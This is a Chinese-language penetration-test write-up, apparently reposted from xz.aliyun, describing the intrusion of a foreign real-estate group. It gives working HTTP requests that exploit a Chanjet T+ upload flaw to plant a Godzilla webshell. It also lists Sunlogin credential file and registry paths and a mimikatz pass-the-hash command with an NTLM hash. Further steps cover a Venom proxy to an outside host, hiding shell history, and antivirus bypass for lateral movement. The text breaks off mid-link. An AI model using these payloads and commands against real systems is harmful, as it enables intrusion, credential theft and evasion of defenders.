---
title: 对某地产集团的一次渗透测试
url: https://buaq.net/go-162156.html
source: unSafe.sh - 不安全
date: 2023-05-08
fetch_date: 2025-10-04T11:37:13.064062
---

# 对某地产集团的一次渗透测试

* [unSafe.sh - 不安全](https://unsafe.sh)
* [我的收藏](/user/collects)
* [今日热榜](/?hot=true)
* [公众号文章](/?gzh=true)
* [导航](/nav/index)
* [Github CVE](/cve)
* [Github Tools](/tools)
* [编码/解码](/encode)
* [文件传输](/share/index)
* [Twitter Bot](https://twitter.com/buaqbot)
* [Telegram Bot](https://t.me/aqinfo)
* [Search](/search/search)

[Rss](/rss.xml)

[ ]
黑夜模式

![](https://8aqnet.cdn.bcebos.com/738bddc95864b678fe0fd6e6954e48f0.jpg)

对某地产集团的一次渗透测试

前言对国外某地产公司的一次测试，测试过程中每一步都有阻碍，不像以往的一帆风顺，对其中涉及的一些点进行一个简单的记录，码较厚，见谅。入口点通过资产测绘发现一个畅
*2023-5-7 18:38:0
Author: [xz.aliyun.com(查看原文)](/jump-162156.htm)
阅读量:107
收藏*

---

## 前言

对国外某地产公司的一次测试，测试过程中每一步都有阻碍，不像以往的一帆风顺，对其中涉及

的一些点进行一个简单的记录，码较厚，见谅。

## 入口点

通过资产测绘发现一个畅捷通系统，经查询资料发现一个CNVD-2022-60632的漏洞

发送一个简单的测试包，发现漏洞存在

```
POST /tplus/SM/SetupAccount/Upload.aspx?preload=1 HTTP/1.1
Host: x.x.x.x
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarywwk2ReqGTj7lNYlt
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36

------WebKitFormBoundarywwk2ReqGTj7lNYlt
Content-Disposition: form-data; name="File1";filename="est.aspx"
Content-Type: image/jpeg

hello word
------WebKitFormBoundarywwk2ReqGTj7lNYlt--
```

开始上传shell，用哥斯拉生成**CShapDynamicPload**的码

cmd执行以下命令，-p为马子的目录，test2为生成的马子的目录

`C:\Windows\Microsoft.NET\Framework\v4.0.30319\aspnet_compiler.exe -v / -p D:\test D:\test2 -fixednames`

将马子和生成的.dll、.complied文件都上传上去

```
POST /tplus/SM/SetupAccount/Upload.aspx?preload=1 HTTP/1.1
Host: xxxx
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36
Content-Length: 1296
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarywwk2ReqGTj7lNYlt
Accept-Encoding: gzip, deflate

------WebKitFormBoundarywwk2ReqGTj7lNYlt
Content-Disposition: form-data; name="File1";filename="test.aspx"
Content-Type: image/jpeg

<%@ Page Language="C#"%><%try{string key = "3c6e0b8a9c15224a";byte[] data = new xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
------WebKitFormBoundarywwk2ReqGTj7lNYlt--
```

```
POST /tplus/SM/SetupAccount/Upload.aspx?preload=1 HTTP/1.1
Host: xxxxxxxxxx
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36
Content-Length: 529
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarywwk2ReqGTj7lNYlt
Accept-Encoding: gzip, deflate

------WebKitFormBoundarywwk2ReqGTj7lNYlt
Content-Disposition: form-data; name="File1";filename="../../../bin/test.aspx.cdcab7d2.compiled"
Content-Type: image/jpeg

ï»¿<?xml version="1.0" encoding="utf-8"?>
<preserve resultType="3" virtualPath="/infotest.aspx" hash="62838a9aa" filehashxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
------WebKitFormBoundarywwk2ReqGTj7lNYlt--
```

```
POST /tplus/SM/SetupAccount/Upload.aspx?preload=1 HTTP/1.1
Host: xxxxx
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36
Content-Length: 529
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarywwk2ReqGTj7lNYlt
Accept-Encoding: gzip, deflate

------WebKitFormBoundarywwk2ReqGTj7lNYlt
Content-Disposition: form-data; name="File1";filename="../../../bin/App_Web_test.aspx.cdcab7d2"
Content-Type: image/jpeg

ï»¿<?xml version="1.0" encoding="utf-8"?>
<preserve resultType="3" virtualPath="/test.aspx" hash="62838a9aa" filehashxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
------WebKitFormBoundarywwk2ReqGTj7lNYlt--
```

访问`http://xxx.xxx.xxx.xxx/tplus/test.aspx?preload=1`，成功上线哥斯拉

![](https://xzfile.aliyuncs.com/media/upload/picture/20230507180641-dd593ed6-ecbe-1.png)

查看有360杀软，还有向日葵远程桌面

![](https://xzfile.aliyuncs.com/media/upload/picture/20230507180845-26ed6f04-ecbf-1.png)

原本想直接读取向日葵配置文件，通过向日葵直接连接到远程桌面，但向日葵的配置文件居然是空白的..

向日葵配置文件路径一般位于以下

```
绿色版：C:\ProgramData\Oray\SunloginClient\config.ini
安装版：C:\Program Files\Oray\SunLogin\SunloginClient\config.ini

注册表查询
安装版：reg query HKEY_USERS\.DEFAULT\Software\Oray\SunLogin\SunloginClient\SunloginInfo
绿色版：reg query HKEY_USERS\.DEFAULT\Software\Oray\SunLogin\SunloginClient\SunloginGreenInfo
简约版：reg query HKEY_USERS\.DEFAULT\Software\Oray\SunLogin\SunloginClient\SunloginLiteInfo
```

`encry_pwd`为本机验证码，为密文，不可解密

`fastcode`为本机识别码，为明文

解密脚本<https://github.com/wafinfo/Sunflower_get_Password>

其实我还可以上传本地的向日葵配置文件去覆盖目标源文件，但这个方法没试，因为以前试过一次没成功，好像还跟版本有关，我还是选择上线到cs再说

因为有360，我随便上了个免杀，上传上去执行的时候报了什么 denied，反正不允许执行

使用哥斯拉自带的内存加载pe文件成功上线

![](https://xzfile.aliyuncs.com/media/upload/picture/20230507183007-2301ac0e-ecc2-1.png)

## 内网

看了下系统是windows server 2012，不能直接抓取明文密码，查了一下arp表还有不少主机，可惜的是不在域里

开始翻主机，翻到一个数据库密码，还是base64的

![](https://xzfile.aliyuncs.com/media/upload/picture/20230507181720-59fbb904-ecc0-1.png)

没有找到其他有用信息了，还是上fscan来一波，没想到fscan不仅没被杀，还能运行？

可以看到两台域控，内网其实还是有机子在域里的，得想办法移到在域的机子里

![](https://xzfile.aliyuncs.com/media/upload/picture/20230507181749-6b176620-ecc0-1.png)

![](https://xzfile.aliyuncs.com/media/upload/picture/20230507181817-7bc9611c-ecc0-1.png)

还有几台ssh弱口令，和一台smb弱口令

![](https://xzfile.aliyuncs.com/media/upload/picture/20230507181851-8fe4e090-ecc0-1.png)

![](https://xzfile.aliyuncs.com/media/upload/picture/20230507181900-955a1a5e-ecc0-1.png)

内网好多资产可以深入，重点是能横移到域里面的机子

先弄个代理将流量送到内网去，cs自带的socks代理是非常难用的，上传ew，执行的时候还是被denied了

无奈用cs自带的socks代理试试，不行，无法访问内网应用

上传frp、venom等代理工具，执行的时候通通被denied，我寻思你是只允许fscan执行是吧，其他应用通通拦截

转个会话到msf，使用msf的socks的代理也同样不行，看来得把杀软关掉

试了几个驱动来干掉360都失败了，试着添加用户也被拦截了

通过不断尝试终于绕过了360，成功添加用户

![](https://xzfile.aliyuncs.com/media/upload/picture/20230507182038-cffb14ec-ecc0-1.png)

打开远程桌面

![](https://xzfile.aliyuncs.com/media/upload/picture/20230507182152-fc4a234e-ecc0-1.png)

虽然打开了远程桌面，但无论如何都无法连接到远程桌面，防火墙放行和关闭了都不行，怀疑内网有其他的防护设备。

使用msf进行了一道端口转发

`portfwd add -l 3389 -r 127.0.0.1 -p 3389`

![](https://xzfile.aliyuncs.com/media/upload/picture/20230507182218-0b42fb82-ecc1-1.png)

但使用新建的用户登陆时，还是失败了，提示不能加载用户的配置文件，怀疑通过这个办法新建的用户有问题

![](https://xzfile.aliyuncs.com/media/upload/picture/20230507182319-30097de2-ecc1-1.png)

server2012默认是不能抓取明文密码的，虽然修改注册表可以，但要重启动静太大了

试着抓了一下，只抓到了一串hash，拿去解密网站也没有解开

但是rdp是可以通过hash直接登录的

使用mimikatz，在win10主机上执行，win7是没有相关参数的

```
privilege::debug
sekurlsa::pth /user:administrator /domain:WIN-E623EEREKAE /ntlm:e2119365a7ce84de9de6e6ff9bdea690 "/run:mstsc.exe /restrictedadmin"
```

随后会弹出一个mstsc窗口，直接点击登陆就行

![](https://xzfile.aliyuncs.com/media/upload/picture/20230507182424-569cb906-ecc1-1.png)

![](https://xzfile.aliyuncs.com/media/upload/picture/20230507182503-6dedb1be-ecc1-1.png)

成功登陆进来，手动退掉360相关安全防护软件

现在来执行venom开启代理就能执行成功了，果然是被360给拦截了，我很好奇他怎么不拦fscan

```
#服务器执行
/admin_linux_x64 -lport 8085

#客户端执行
agent.exe -rhost xxx.xxx.xxx.xxx -rport  8085

goto 1 #进入节点1
socks 8050 #开启socks5代理
```

![](https://xzfile.aliyuncs.com/media/upload/picture/20230507182525-7ad5bfb6-ecc1-1.png)

配置proxychains.conf，先连接那个几ssh弱口令看看

![](https://xzfile.aliyuncs.com/media/upload/picture/20230507182537-825cd148-ecc1-1.png)

![](https://xzfile.aliyuncs.com/media/upload/picture/20230507182551-8a3a828e-ecc1-1.png)

关闭历史命令记录

`空格set +o history`

通过history发现了几个密码

![](https://xzfile.aliyuncs.com/media/upload/picture/20230507182605-92a41b88-ecc1-1.png)

![](https://xzfile.aliyuncs.com/media/upload/picture/20230507182613-97c9240a-ecc1-1.png)

登录到数据库，但数据库里没发现什么东西，大部分都是空表

![](https://xzfile.aliyuncs.com/media/upload/picture/20230507182625-9e8aacf0-ecc1-1.png)

![](https://xzfile.aliyun...